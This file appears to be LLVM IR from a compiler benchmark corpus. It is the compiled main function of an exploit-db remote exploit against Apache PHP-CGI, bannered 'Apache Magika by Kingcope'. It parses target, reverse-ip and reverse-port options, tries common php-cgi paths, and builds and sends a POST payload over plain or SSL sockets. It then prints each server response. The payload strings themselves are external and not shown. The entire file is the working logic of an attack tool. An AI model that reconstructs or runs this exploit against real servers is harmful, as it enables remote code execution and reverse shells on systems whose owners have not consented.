; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/php/remote/extr_29290.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/php/remote/extr_29290.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

%struct.option = type { i8*, i32, i32, i32 }
%struct.sockaddr_in = type { i32 }
%struct.TYPE_3__ = type { i32*, i32* }

@.str = private unnamed_addr constant [35 x i8] c"-== Apache Magika by Kingcope ==-\0A\00", align 1
@main.long_options = internal global [7 x %struct.option] [%struct.option { i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.1, i32 0, i32 0), i32 128, i32 0, i32 0 }, %struct.option { i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.2, i32 0, i32 0), i32 128, i32 0, i32 0 }, %struct.option { i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.3, i32 0, i32 0), i32 128, i32 0, i32 0 }, %struct.option { i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.4, i32 0, i32 0), i32 128, i32 0, i32 0 }, %struct.option { i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.5, i32 0, i32 0), i32 128, i32 0, i32 0 }, %struct.option { i8* getelementptr inbounds ([18 x i8], [18 x i8]* @.str.6, i32 0, i32 0), i32 128, i32 0, i32 0 }, %struct.option zeroinitializer], align 16
@.str.1 = private unnamed_addr constant [7 x i8] c"target\00", align 1
@.str.2 = private unnamed_addr constant [5 x i8] c"port\00", align 1
@.str.3 = private unnamed_addr constant [9 x i8] c"protocol\00", align 1
@.str.4 = private unnamed_addr constant [11 x i8] c"reverse-ip\00", align 1
@.str.5 = private unnamed_addr constant [13 x i8] c"reverse-port\00", align 1
@.str.6 = private unnamed_addr constant [18 x i8] c"force-interpreter\00", align 1
@.str.7 = private unnamed_addr constant [1 x i8] zeroinitializer, align 1
@optarg = common dso_local global i8* null, align 8
@.str.8 = private unnamed_addr constant [18 x i8] c"calloc error (2)\0A\00", align 1
@.str.9 = private unnamed_addr constant [18 x i8] c"calloc error (3)\0A\00", align 1
@.str.10 = private unnamed_addr constant [6 x i8] c"https\00", align 1
@.str.11 = private unnamed_addr constant [18 x i8] c"calloc error (4)\0A\00", align 1
@.str.12 = private unnamed_addr constant [18 x i8] c"calloc error (5)\0A\00", align 1
@.str.13 = private unnamed_addr constant [18 x i8] c"calloc error (6)\0A\00", align 1
@optind = common dso_local global i32 0, align 4
@.str.14 = private unnamed_addr constant [37 x i8] c"Error while resolving hostname. (7)\0A\00", align 1
@.str.15 = private unnamed_addr constant [13 x i8] c"/cgi-bin/php\00", align 1
@.str.16 = private unnamed_addr constant [14 x i8] c"/cgi-bin/php5\00", align 1
@.str.17 = private unnamed_addr constant [17 x i8] c"/cgi-bin/php-cgi\00", align 1
@.str.18 = private unnamed_addr constant [17 x i8] c"/cgi-bin/php.cgi\00", align 1
@.str.19 = private unnamed_addr constant [14 x i8] c"/cgi-bin/php4\00", align 1
@.str.20 = private unnamed_addr constant [4 x i8] c"%s\0A\00", align 1
@AF_INET = common dso_local global i32 0, align 4
@SOCK_STREAM = common dso_local global i32 0, align 4
@.str.21 = private unnamed_addr constant [18 x i8] c"socket error (8)\0A\00", align 1
@.str.22 = private unnamed_addr constant [19 x i8] c"connect error (9)\0A\00", align 1
@.str.23 = private unnamed_addr constant [19 x i8] c"malloc error (10)\0A\00", align 1
@.str.24 = private unnamed_addr constant [24 x i8] c"SSL_CTX_new error (11)\0A\00", align 1
@.str.25 = private unnamed_addr constant [20 x i8] c"SSL_new error (12)\0A\00", align 1
@.str.26 = private unnamed_addr constant [23 x i8] c"SSL_set_fd error (13)\0A\00", align 1
@.str.27 = private unnamed_addr constant [24 x i8] c"SSL_connect error (14)\0A\00", align 1
@phpstr = common dso_local global i8* null, align 8
@poststr = common dso_local global i8* null, align 8
@.str.28 = private unnamed_addr constant [28 x i8] c"***SERVER RESPONSE***\0A\0A%s\0A\0A\00", align 1
@.str.29 = private unnamed_addr constant [17 x i8] c"read error (15)\0A\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local void @main(i32 %0, i8** %1) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i8**, align 8
  %5 = alloca i8*, align 8
  %6 = alloca i8*, align 8
  %7 = alloca i8*, align 8
  %8 = alloca i8*, align 8
  %9 = alloca i8*, align 8
  %10 = alloca i8*, align 8
  %11 = alloca i8*, align 8
  %12 = alloca i8*, align 8
  %13 = alloca i8*, align 8
  %14 = alloca i8*, align 8
  %15 = alloca i8, align 1
  %16 = alloca i16, align 2
  %17 = alloca i16, align 2
  %18 = alloca %struct.sockaddr_in*, align 8
  %19 = alloca i32, align 4
  %20 = alloca i32, align 4
  %21 = alloca i32, align 4
  %22 = alloca i32, align 4
  %23 = alloca %struct.TYPE_3__*, align 8
  %24 = alloca i32, align 4
  %25 = alloca i32, align 4
  %26 = alloca [5 x i8*], align 16
  %27 = alloca i32, align 4
  store i32 %0, i32* %3, align 4
  store i8** %1, i8*** %4, align 8
  store i8* null, i8** %10, align 8
  store i8* null, i8** %14, align 8
  store i8 0, i8* %15, align 1
  store i16 0, i16* %16, align 2
  store i16 0, i16* %17, align 2
  %28 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([35 x i8], [35 x i8]* @.str, i64 0, i64 0))
  br label %29

29:                                               ; preds = %150, %2
  store i32 0, i32* %25, align 4
  %30 = load i32, i32* %3, align 4
  %31 = load i8**, i8*** %4, align 8
  %32 = call i32 @getopt_long(i32 %30, i8** %31, i8* getelementptr inbounds ([1 x i8], [1 x i8]* @.str.7, i64 0, i64 0), %struct.option* getelementptr inbounds ([7 x %struct.option], [7 x %struct.option]* @main.long_options, i64 0, i64 0), i32* %25)
  store i32 %32, i32* %24, align 4
  %33 = load i32, i32* %24, align 4
  %34 = icmp slt i32 %33, 0
  br i1 %34, label %35, label %36

35:                                               ; preds = %29
  br label %151

36:                                               ; preds = %29
  %37 = load i32, i32* %24, align 4
  switch i32 %37, label %147 [
    i32 0, label %38
  ]

38:                                               ; preds = %36
  %39 = load i32, i32* %25, align 4
  switch i32 %39, label %143 [
    i32 0, label %40
    i32 1, label %61
    i32 2, label %68
    i32 3, label %90
    i32 4, label %107
    i32 5, label %126
  ]

40:                                               ; preds = %38
  %41 = load i8*, i8** @optarg, align 8
  %42 = icmp ne i8* %41, null
  br i1 %42, label %43, label %60

43:                                               ; preds = %40
  %44 = load i8*, i8** @optarg, align 8
  %45 = call i32 @strlen(i8* %44)
  %46 = add nsw i32 %45, 1
  %47 = call i8* @calloc(i32 %46, i32 1)
  store i8* %47, i8** %5, align 8
  %48 = load i8*, i8** %5, align 8
  %49 = icmp ne i8* %48, null
  br i1 %49, label %53, label %50

50:                                               ; preds = %43
  %51 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([18 x i8], [18 x i8]* @.str.8, i64 0, i64 0))
  %52 = call i32 @exit(i32 255) #3
  unreachable

53:                                               ; preds = %43
  %54 = load i8*, i8** %5, align 8
  %55 = load i8*, i8** @optarg, align 8
  %56 = load i8*, i8** @optarg, align 8
  %57 = call i32 @strlen(i8* %56)
  %58 = add nsw i32 %57, 1
  %59 = call i32 @memcpy(i8* %54, i8* %55, i32 %58)
  br label %60

60:                                               ; preds = %53, %40
  br label %146

61:                                               ; preds = %38
  %62 = load i8*, i8** @optarg, align 8
  %63 = icmp ne i8* %62, null
  br i1 %63, label %64, label %67

64:                                               ; preds = %61
  %65 = load i8*, i8** @optarg, align 8
  %66 = call zeroext i16 @atoi(i8* %65)
  store i16 %66, i16* %16, align 2
  br label %67

67:                                               ; preds = %64, %61
  br label %146

68:                                               ; preds = %38
  %69 = load i8*, i8** @optarg, align 8
  %70 = call i32 @strlen(i8* %69)
  %71 = add nsw i32 %70, 1
  %72 = call i8* @calloc(i32 %71, i32 1)
  store i8* %72, i8** %6, align 8
  %73 = load i8*, i8** %6, align 8
  %74 = icmp ne i8* %73, null
  br i1 %74, label %78, label %75

75:                                               ; preds = %68
  %76 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([18 x i8], [18 x i8]* @.str.9, i64 0, i64 0))
  %77 = call i32 @exit(i32 255) #3
  unreachable

78:                                               ; preds = %68
  %79 = load i8*, i8** %6, align 8
  %80 = load i8*, i8** @optarg, align 8
  %81 = load i8*, i8** @optarg, align 8
  %82 = call i32 @strlen(i8* %81)
  %83 = add nsw i32 %82, 1
  %84 = call i32 @memcpy(i8* %79, i8* %80, i32 %83)
  %85 = load i8*, i8** %6, align 8
  %86 = call i32 @strcmp(i8* %85, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.10, i64 0, i64 0))
  %87 = icmp ne i32 %86, 0
  br i1 %87, label %89, label %88

88:                                               ; preds = %78
  store i8 1, i8* %15, align 1
  br label %89

89:                                               ; preds = %88, %78
  br label %146

90:                                               ; preds = %38
  %91 = load i8*, i8** @optarg, align 8
  %92 = call i32 @strlen(i8* %91)
  %93 = add nsw i32 %92, 1
  %94 = call i8* @calloc(i32 %93, i32 1)
  store i8* %94, i8** %12, align 8
  %95 = load i8*, i8** %12, align 8
  %96 = icmp ne i8* %95, null
  br i1 %96, label %100, label %97

97:                                               ; preds = %90
  %98 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([18 x i8], [18 x i8]* @.str.11, i64 0, i64 0))
  %99 = call i32 @exit(i32 255) #3
  unreachable

100:                                              ; preds = %90
  %101 = load i8*, i8** %12, align 8
  %102 = load i8*, i8** @optarg, align 8
  %103 = load i8*, i8** @optarg, align 8
  %104 = call i32 @strlen(i8* %103)
  %105 = add nsw i32 %104, 1
  %106 = call i32 @memcpy(i8* %101, i8* %102, i32 %105)
  br label %146

107:                                              ; preds = %38
  %108 = load i8*, i8** @optarg, align 8
  %109 = call zeroext i16 @atoi(i8* %108)
  store i16 %109, i16* %17, align 2
  %110 = load i8*, i8** @optarg, align 8
  %111 = call i32 @strlen(i8* %110)
  %112 = add nsw i32 %111, 1
  %113 = call i8* @calloc(i32 %112, i32 1)
  store i8* %113, i8** %13, align 8
  %114 = load i8*, i8** %13, align 8
  %115 = icmp ne i8* %114, null
  br i1 %115, label %119, label %116

116:                                              ; preds = %107
  %117 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([18 x i8], [18 x i8]* @.str.12, i64 0, i64 0))
  %118 = call i32 @exit(i32 255) #3
  unreachable

119:                                              ; preds = %107
  %120 = load i8*, i8** %13, align 8
  %121 = load i8*, i8** @optarg, align 8
  %122 = load i8*, i8** @optarg, align 8
  %123 = call i32 @strlen(i8* %122)
  %124 = add nsw i32 %123, 1
  %125 = call i32 @memcpy(i8* %120, i8* %121, i32 %124)
  br label %146

126:                                              ; preds = %38
  %127 = load i8*, i8** @optarg, align 8
  %128 = call i32 @strlen(i8* %127)
  %129 = add nsw i32 %128, 1
  %130 = call i8* @calloc(i32 %129, i32 1)
  store i8* %130, i8** %14, align 8
  %131 = load i8*, i8** %14, align 8
  %132 = icmp ne i8* %131, null
  br i1 %132, label %136, label %133

133:                                              ; preds = %126
  %134 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([18 x i8], [18 x i8]* @.str.13, i64 0, i64 0))
  %135 = call i32 @exit(i32 255) #3
  unreachable

136:                                              ; preds = %126
  %137 = load i8*, i8** %14, align 8
  %138 = load i8*, i8** @optarg, align 8
  %139 = load i8*, i8** @optarg, align 8
  %140 = call i32 @strlen(i8* %139)
  %141 = add nsw i32 %140, 1
  %142 = call i32 @memcpy(i8* %137, i8* %138, i32 %141)
  br label %146

143:                                              ; preds = %38
  %144 = load i8**, i8*** %4, align 8
  %145 = call i32 @usage(i8** %144)
  br label %146

146:                                              ; preds = %143, %136, %119, %100, %89, %67, %60
  br label %150

147:                                              ; preds = %36
  %148 = load i8**, i8*** %4, align 8
  %149 = call i32 @usage(i8** %148)
  br label %150

150:                                              ; preds = %147, %146
  br label %29

151:                                              ; preds = %35
  %152 = load i32, i32* @optind, align 4
  %153 = load i32, i32* %3, align 4
  %154 = icmp slt i32 %152, %153
  br i1 %154, label %170, label %155

155:                                              ; preds = %151
  %156 = load i8*, i8** %5, align 8
  %157 = icmp ne i8* %156, null
  br i1 %157, label %158, label %170

158:                                              ; preds = %155
  %159 = load i8*, i8** %6, align 8
  %160 = icmp ne i8* %159, null
  br i1 %160, label %161, label %170

161:                                              ; preds = %158
  %162 = load i16, i16* %16, align 2
  %163 = icmp ne i16 %162, 0
  br i1 %163, label %164, label %170

164:                                              ; preds = %161
  %165 = load i8*, i8** %12, align 8
  %166 = icmp ne i8* %165, null
  br i1 %166, label %167, label %170

167:                                              ; preds = %164
  %168 = load i16, i16* %17, align 2
  %169 = icmp ne i16 %168, 0
  br i1 %169, label %173, label %170

170:                                              ; preds = %167, %164, %161, %158, %155, %151
  %171 = load i8**, i8*** %4, align 8
  %172 = call i32 @usage(i8** %171)
  br label %173

173:                                              ; preds = %170, %167
  %174 = load i8*, i8** %5, align 8
  %175 = load i16, i16* %16, align 2
  %176 = call %struct.sockaddr_in* @gethostbyname_(i8* %174, i16 zeroext %175)
  store %struct.sockaddr_in* %176, %struct.sockaddr_in** %18, align 8
  %177 = load %struct.sockaddr_in*, %struct.sockaddr_in** %18, align 8
  %178 = icmp ne %struct.sockaddr_in* %177, null
  br i1 %178, label %182, label %179

179:                                              ; preds = %173
  %180 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([37 x i8], [37 x i8]* @.str.14, i64 0, i64 0))
  %181 = call i32 @exit(i32 255) #3
  unreachable

182:                                              ; preds = %173
  store i32 5, i32* %27, align 4
  %183 = call i8* @strdup(i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.15, i64 0, i64 0))
  %184 = getelementptr inbounds [5 x i8*], [5 x i8*]* %26, i64 0, i64 0
  store i8* %183, i8** %184, align 16
  %185 = call i8* @strdup(i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.16, i64 0, i64 0))
  %186 = getelementptr inbounds [5 x i8*], [5 x i8*]* %26, i64 0, i64 1
  store i8* %185, i8** %186, align 8
  %187 = call i8* @strdup(i8* getelementptr inbounds ([17 x i8], [17 x i8]* @.str.17, i64 0, i64 0))
  %188 = getelementptr inbounds [5 x i8*], [5 x i8*]* %26, i64 0, i64 2
  store i8* %187, i8** %188, align 16
  %189 = call i8* @strdup(i8* getelementptr inbounds ([17 x i8], [17 x i8]* @.str.18, i64 0, i64 0))
  %190 = getelementptr inbounds [5 x i8*], [5 x i8*]* %26, i64 0, i64 3
  store i8* %189, i8** %190, align 8
  %191 = call i8* @strdup(i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.19, i64 0, i64 0))
  %192 = getelementptr inbounds [5 x i8*], [5 x i8*]* %26, i64 0, i64 4
  store i8* %191, i8** %192, align 16
  store i32 0, i32* %22, align 4
  br label %193

193:                                              ; preds = %368, %182
  %194 = load i32, i32* %22, align 4
  %195 = load i32, i32* %27, align 4
  %196 = icmp ult i32 %194, %195
  br i1 %196, label %197, label %371

197:                                              ; preds = %193
  %198 = load i32, i32* %22, align 4
  %199 = zext i32 %198 to i64
  %200 = getelementptr inbounds [5 x i8*], [5 x i8*]* %26, i64 0, i64 %199
  %201 = load i8*, i8** %200, align 8
  store i8* %201, i8** %11, align 8
  %202 = load i8*, i8** %14, align 8
  %203 = icmp ne i8* %202, null
  br i1 %203, label %204, label %207

204:                                              ; preds = %197
  %205 = load i8*, i8** %14, align 8
  %206 = call i8* @strdup(i8* %205)
  store i8* %206, i8** %11, align 8
  br label %207

207:                                              ; preds = %204, %197
  %208 = load i8*, i8** %14, align 8
  %209 = icmp ne i8* %208, null
  br i1 %209, label %210, label %214

210:                                              ; preds = %207
  %211 = load i32, i32* %22, align 4
  %212 = icmp ne i32 %211, 0
  br i1 %212, label %213, label %214

213:                                              ; preds = %210
  br label %371

214:                                              ; preds = %210, %207
  %215 = load i8*, i8** %11, align 8
  %216 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.20, i64 0, i64 0), i8* %215)
  %217 = load i32, i32* @AF_INET, align 4
  %218 = load i32, i32* @SOCK_STREAM, align 4
  %219 = call i32 @socket(i32 %217, i32 %218, i32 0)
  store i32 %219, i32* %19, align 4
  %220 = load i32, i32* %19, align 4
  %221 = icmp slt i32 %220, 1
  br i1 %221, label %222, label %225

222:                                              ; preds = %214
  %223 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([18 x i8], [18 x i8]* @.str.21, i64 0, i64 0))
  %224 = call i32 @exit(i32 255) #3
  unreachable

225:                                              ; preds = %214
  %226 = load i32, i32* %19, align 4
  %227 = load %struct.sockaddr_in*, %struct.sockaddr_in** %18, align 8
  %228 = bitcast %struct.sockaddr_in* %227 to i8*
  %229 = call i64 @connect(i32 %226, i8* %228, i32 4)
  %230 = icmp slt i64 %229, 0
  br i1 %230, label %231, label %234

231:                                              ; preds = %225
  %232 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([19 x i8], [19 x i8]* @.str.22, i64 0, i64 0))
  %233 = call i32 @exit(i32 255) #3
  unreachable

234:                                              ; preds = %225
  %235 = load i8, i8* %15, align 1
  %236 = icmp ne i8 %235, 0
  br i1 %236, label %237, label %296

237:                                              ; preds = %234
  %238 = call i64 @malloc(i32 16)
  %239 = inttoptr i64 %238 to %struct.TYPE_3__*
  store %struct.TYPE_3__* %239, %struct.TYPE_3__** %23, align 8
  %240 = load %struct.TYPE_3__*, %struct.TYPE_3__** %23, align 8
  %241 = icmp ne %struct.TYPE_3__* %240, null
  br i1 %241, label %245, label %242

242:                                              ; preds = %237
  %243 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([19 x i8], [19 x i8]* @.str.23, i64 0, i64 0))
  %244 = call i32 @exit(i32 255) #3
  unreachable

245:                                              ; preds = %237
  %246 = load %struct.TYPE_3__*, %struct.TYPE_3__** %23, align 8
  %247 = getelementptr inbounds %struct.TYPE_3__, %struct.TYPE_3__* %246, i32 0, i32 0
  store i32* null, i32** %247, align 8
  %248 = load %struct.TYPE_3__*, %struct.TYPE_3__** %23, align 8
  %249 = getelementptr inbounds %struct.TYPE_3__, %struct.TYPE_3__* %248, i32 0, i32 1
  store i32* null, i32** %249, align 8
  %250 = call i32 (...) @SSL_library_init()
  %251 = call i32 (...) @SSLv23_client_method()
  %252 = call i32* @SSL_CTX_new(i32 %251)
  %253 = load %struct.TYPE_3__*, %struct.TYPE_3__** %23, align 8
  %254 = getelementptr inbounds %struct.TYPE_3__, %struct.TYPE_3__* %253, i32 0, i32 1
  store i32* %252, i32** %254, align 8
  %255 = load %struct.TYPE_3__*, %struct.TYPE_3__** %23, align 8
  %256 = getelementptr inbounds %struct.TYPE_3__, %struct.TYPE_3__* %255, i32 0, i32 1
  %257 = load i32*, i32** %256, align 8
  %258 = icmp ne i32* %257, null
  br i1 %258, label %262, label %259

259:                                              ; preds = %245
  %260 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([24 x i8], [24 x i8]* @.str.24, i64 0, i64 0))
  %261 = call i32 @exit(i32 255) #3
  unreachable

262:                                              ; preds = %245
  %263 = load %struct.TYPE_3__*, %struct.TYPE_3__** %23, align 8
  %264 = getelementptr inbounds %struct.TYPE_3__, %struct.TYPE_3__* %263, i32 0, i32 1
  %265 = load i32*, i32** %264, align 8
  %266 = call i32* @SSL_new(i32* %265)
  %267 = load %struct.TYPE_3__*, %struct.TYPE_3__** %23, align 8
  %268 = getelementptr inbounds %struct.TYPE_3__, %struct.TYPE_3__* %267, i32 0, i32 0
  store i32* %266, i32** %268, align 8
  %269 = load %struct.TYPE_3__*, %struct.TYPE_3__** %23, align 8
  %270 = getelementptr inbounds %struct.TYPE_3__, %struct.TYPE_3__* %269, i32 0, i32 0
  %271 = load i32*, i32** %270, align 8
  %272 = icmp ne i32* %271, null
  br i1 %272, label %276, label %273

273:                                              ; preds = %262
  %274 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([20 x i8], [20 x i8]* @.str.25, i64 0, i64 0))
  %275 = call i32 @exit(i32 255) #3
  unreachable

276:                                              ; preds = %262
  %277 = load %struct.TYPE_3__*, %struct.TYPE_3__** %23, align 8
  %278 = getelementptr inbounds %struct.TYPE_3__, %struct.TYPE_3__* %277, i32 0, i32 0
  %279 = load i32*, i32** %278, align 8
  %280 = load i32, i32* %19, align 4
  %281 = call i32 @SSL_set_fd(i32* %279, i32 %280)
  %282 = icmp ne i32 %281, 0
  br i1 %282, label %286, label %283

283:                                              ; preds = %276
  %284 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([23 x i8], [23 x i8]* @.str.26, i64 0, i64 0))
  %285 = call i32 @exit(i32 255) #3
  unreachable

286:                                              ; preds = %276
  %287 = load %struct.TYPE_3__*, %struct.TYPE_3__** %23, align 8
  %288 = getelementptr inbounds %struct.TYPE_3__, %struct.TYPE_3__* %287, i32 0, i32 0
  %289 = load i32*, i32** %288, align 8
  %290 = call i32 @SSL_connect(i32* %289)
  %291 = icmp ne i32 %290, 1
  br i1 %291, label %292, label %295

292:                                              ; preds = %286
  %293 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([24 x i8], [24 x i8]* @.str.27, i64 0, i64 0))
  %294 = call i32 @exit(i32 255) #3
  unreachable

295:                                              ; preds = %286
  br label %296

296:                                              ; preds = %295, %234
  %297 = load i8*, i8** @phpstr, align 8
  %298 = call i32 @strlen(i8* %297)
  %299 = load i8*, i8** %12, align 8
  %300 = call i32 @strlen(i8* %299)
  %301 = add nsw i32 %298, %300
  %302 = load i8*, i8** %13, align 8
  %303 = call i32 @strlen(i8* %302)
  %304 = add nsw i32 %301, %303
  %305 = add nsw i32 %304, 64
  store i32 %305, i32* %21, align 4
  %306 = load i32, i32* %21, align 4
  %307 = call i8* @calloc(i32 %306, i32 1)
  store i8* %307, i8** %9, align 8
  %308 = load i8*, i8** %9, align 8
  %309 = load i32, i32* %21, align 4
  %310 = load i8*, i8** @phpstr, align 8
  %311 = load i8*, i8** %12, align 8
  %312 = load i16, i16* %17, align 2
  %313 = zext i16 %312 to i32
  %314 = call i32 (i8*, i32, i8*, i8*, ...) @snprintf(i8* %308, i32 %309, i8* %310, i8* %311, i32 %313)
  %315 = load i8*, i8** %5, align 8
  %316 = call i32 @strlen(i8* %315)
  %317 = load i8*, i8** %11, align 8
  %318 = call i32 @strlen(i8* %317)
  %319 = add nsw i32 %316, %318
  %320 = load i8*, i8** @poststr, align 8
  %321 = call i32 @strlen(i8* %320)
  %322 = add nsw i32 %319, %321
  %323 = load i8*, i8** %9, align 8
  %324 = call i32 @strlen(i8* %323)
  %325 = add nsw i32 %322, %324
  %326 = add nsw i32 %325, 64
  store i32 %326, i32* %20, align 4
  %327 = load i32, i32* %20, align 4
  %328 = call i8* @calloc(i32 %327, i32 1)
  store i8* %328, i8** %8, align 8
  %329 = load i8*, i8** %8, align 8
  %330 = load i32, i32* %20, align 4
  %331 = load i8*, i8** @poststr, align 8
  %332 = load i8*, i8** %11, align 8
  %333 = load i8*, i8** %5, align 8
  %334 = load i8*, i8** %9, align 8
  %335 = call i32 @strlen(i8* %334)
  %336 = load i8*, i8** %9, align 8
  %337 = call i32 (i8*, i32, i8*, i8*, ...) @snprintf(i8* %329, i32 %330, i8* %331, i8* %332, i8* %333, i32 %335, i8* %336)
  %338 = load i8, i8* %15, align 1
  %339 = icmp ne i8 %338, 0
  br i1 %339, label %348, label %340

340:                                              ; preds = %296
  %341 = load i32, i32* %19, align 4
  %342 = load i8*, i8** %8, align 8
  %343 = load i8*, i8** %8, align 8
  %344 = call i32 @strlen(i8* %343)
  %345 = call i32 @write(i32 %341, i8* %342, i32 %344)
  %346 = load i32, i32* %19, align 4
  %347 = call i8* @read_(i32 %346)
  store i8* %347, i8** %10, align 8
  br label %358

348:                                              ; preds = %296
  %349 = load %struct.TYPE_3__*, %struct.TYPE_3__** %23, align 8
  %350 = getelementptr inbounds %struct.TYPE_3__, %struct.TYPE_3__* %349, i32 0, i32 0
  %351 = load i32*, i32** %350, align 8
  %352 = load i8*, i8** %8, align 8
  %353 = load i8*, i8** %8, align 8
  %354 = call i32 @strlen(i8* %353)
  %355 = call i32 @SSL_write(i32* %351, i8* %352, i32 %354)
  %356 = load %struct.TYPE_3__*, %struct.TYPE_3__** %23, align 8
  %357 = call i8* @sslread(%struct.TYPE_3__* %356)
  store i8* %357, i8** %10, align 8
  br label %358

358:                                              ; preds = %348, %340
  %359 = load i8*, i8** %10, align 8
  %360 = icmp ne i8* %359, null
  br i1 %360, label %361, label %364

361:                                              ; preds = %358
  %362 = load i8*, i8** %10, align 8
  %363 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([28 x i8], [28 x i8]* @.str.28, i64 0, i64 0), i8* %362)
  br label %367

364:                                              ; preds = %358
  %365 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([17 x i8], [17 x i8]* @.str.29, i64 0, i64 0))
  %366 = call i32 @exit(i32 255) #3
  unreachable

367:                                              ; preds = %361
  br label %368

368:                                              ; preds = %367
  %369 = load i32, i32* %22, align 4
  %370 = add i32 %369, 1
  store i32 %370, i32* %22, align 4
  br label %193

371:                                              ; preds = %213, %193
  %372 = call i32 @exit(i32 1) #3
  unreachable
}

declare dso_local i32 @printf(i8*, ...) #1

declare dso_local i32 @getopt_long(i32, i8**, i8*, %struct.option*, i32*) #1

declare dso_local i8* @calloc(i32, i32) #1

declare dso_local i32 @strlen(i8*) #1

; Function Attrs: noreturn
declare dso_local i32 @exit(i32) #2

declare dso_local i32 @memcpy(i8*, i8*, i32) #1

declare dso_local zeroext i16 @atoi(i8*) #1

declare dso_local i32 @strcmp(i8*, i8*) #1

declare dso_local i32 @usage(i8**) #1

declare dso_local %struct.sockaddr_in* @gethostbyname_(i8*, i16 zeroext) #1

declare dso_local i8* @strdup(i8*) #1

declare dso_local i32 @socket(i32, i32, i32) #1

declare dso_local i64 @connect(i32, i8*, i32) #1

declare dso_local i64 @malloc(i32) #1

declare dso_local i32 @SSL_library_init(...) #1

declare dso_local i32* @SSL_CTX_new(i32) #1

declare dso_local i32 @SSLv23_client_method(...) #1

declare dso_local i32* @SSL_new(i32*) #1

declare dso_local i32 @SSL_set_fd(i32*, i32) #1

declare dso_local i32 @SSL_connect(i32*) #1

declare dso_local i32 @snprintf(i8*, i32, i8*, i8*, ...) #1

declare dso_local i32 @write(i32, i8*, i32) #1

declare dso_local i8* @read_(i32) #1

declare dso_local i32 @SSL_write(i32*, i8*, i32) #1

declare dso_local i8* @sslread(%struct.TYPE_3__*) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #2 = { noreturn "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #3 = { noreturn }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
